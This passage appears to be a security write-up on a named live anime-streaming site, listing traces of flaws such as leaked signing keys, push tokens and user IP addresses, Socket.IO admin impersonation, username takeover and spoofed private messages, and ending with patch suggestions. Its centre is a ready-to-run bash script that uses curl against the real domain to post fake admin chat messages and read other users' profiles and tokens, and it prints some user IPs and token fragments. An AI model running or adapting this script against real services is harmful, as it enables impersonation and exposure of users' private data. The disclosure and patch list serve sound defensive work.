# EXECUTION TRACE 3: FCM Token & Signing Key Leak

**Request:**
```
GET /api/me
Authorization: Bearer haitravas_token
```

**Response:**
```json
{
  "signingKey": "[REDACTED]",
  "devices": {
    "23ebf7f73c090b1afafbc5da1775a9...": {
      "fcmToken [REDACTED]:APA91bGjYvYQH5g3stkL4dNw8_1jK7JQ..."
    }
  },
  "activeTokens": [{"jti": "[REDACTED]", "ip": "2001:d08:e4:b882:84ee:badb:f619:5442"}],
  "creationIP": "2001:d08:e4:b882:84ee:badb:f619:5442",
  "lastLoginIP": "2001:d08:e4:b882:84ee:badb:f619:5442"
}
```

**Impact:** JWT signing key, FCM push tokens, user IPs all exposed to any authenticated user.

---

# EXECUTION TRACE 4: Global Chat Admin Impersonation

**Request:**
```
POST /socket.io/?EIO=4&transport=polling&sid={SID}
42["send_message",{"user":"ADMIN","text":"[SECURITY] PoC: Admin impersonation works","avatarSeed":"admin","isAdmin":true,"adminRole":"developer"}]
```

**Response:**
```
ok
```

**Impact:** Any user can send messages as "ADMIN" to the global chat. All connected users see fake admin messages.

---

# EXECUTION TRACE 5: Username Takeover

**Request:**
```
PUT /api/me
Authorization: Bearer haitravas_token
Body: {"username":"Yareee-admin-claim"}
```

**Response:**
```json
{"message":"Updated","user":{"id":"569","username":"Yareeeadminclaim",...}}
```

**Impact:** No server-side uniqueness validation. Any user can claim any username including admin usernames.

---

# EXECUTION TRACE 6: Private Message Injection

**Request:**
```
POST /socket.io/?EIO=4&transport=polling&sid={SID}
42["send_private_message",{"to":13,"text":"[PoC] This message was sent from haitravas account","from":569}]
```

**Response:**
```
ok
```

**Impact:** Can send private messages to any user from any identity.

---

# EXECUTION TRACE 7: Anti-Cheat Trigger

**Request:**
```
POST /api/danmaku/episode1/1
Body: {"text":"PoC test","time":0}
```

**Response:**
```json
{"message":"Danmaku terkirim","danmaku":{"id":"dmk_...","username":"Yareeeadminclaim"}}
```

**Anti-cheat status from /api/me:**
```json
"antiCheat": {"score": 60, "status": "hold", "totalFindings": 1, "lastCodes": ["client-authoritative-field"]}
```

**Impact:** Server tracks anti-cheat score per user. Score 60 = hold. Score ≥75 = ban.

---

# EXECUTION TRACE 8: Why Friends Got Banned

**Request that triggers ban:**
```
PUT /api/me
Body: {"isAdmin": true}
```

**Response:**
```json
{"message":"Akun diblokir karena aktivitas mencurigakan terdeteksi.","antiCheat":true,"banned":true}
```

**Root cause:** Server detects any modification to `isAdmin`, `adminRole`, `vionimeSepuh` fields via `PUT /api/me` and instantly bans the account.

---

## Exploitation Script

```bash
#!/bin/bash
TOKEN="YOUR_JWT_TOKEN"
UA="Mozilla/5.0 (Linux; Android 16; LGN-NX1 Build/HONORLGN-N31; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/151.0.7922.199 Mobile Safari/537.36 VioNime/1.6.2 (Android)"

# Get Socket.IO session
SID=$(curl -sk "https://vionime.xyz/socket.io/?EIO=4&transport=polling&_ua_token=$TOKEN" | python3 -c "import sys,json; print(json.loads(sys.stdin.read()[1:])['sid'])")

# Join chat
curl -sk -X POST "https://vionime.xyz/socket.io/?EIO=4&transport=polling&sid=$SID&_ua_token=$TOKEN" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d '42["join_chat","haitravas"]'

# Send as ADMIN
curl -sk -X POST "https://vionime.xyz/socket.io/?EIO=4&transport=polling&sid=$SID&_ua_token=$TOKEN" \
  -H "Content-Type: text/plain;charset=UTF-8" \
  -d '42["send_message",{"user":"ADMIN","text":"[ALERT] Fake admin message","avatarSeed":"admin","isAdmin":true}]'

# Read any user's data
curl -sk "https://vionime.xyz/api/user/profile/13" -H "Authorization: Bearer $TOKEN"

# Read FCM tokens
curl -sk "https://vionime.xyz/api/me" -H "Authorization: Bearer $TOKEN" | python3 -m json.tool
```

---

# PATCH SEQUENCEs

1. **Add server-side validation for `send_message`** — verify `user` field matches authenticated user
2. **Add rate limiting to Socket.IO** — prevent spam
3. **Remove PII from `/api/me`** — don't return FCM tokens, signing key, or IP addresses
4. **Add authorization to `/api/user/profile/{id}`** — don't return sensitive fields
5. **Validate username uniqueness** on `PUT /api/me`
6. **Admin panel:** Add 2FA, stronger password requirements
7. **Anti-cheat:** Increase hold thresholds to reduce false positives

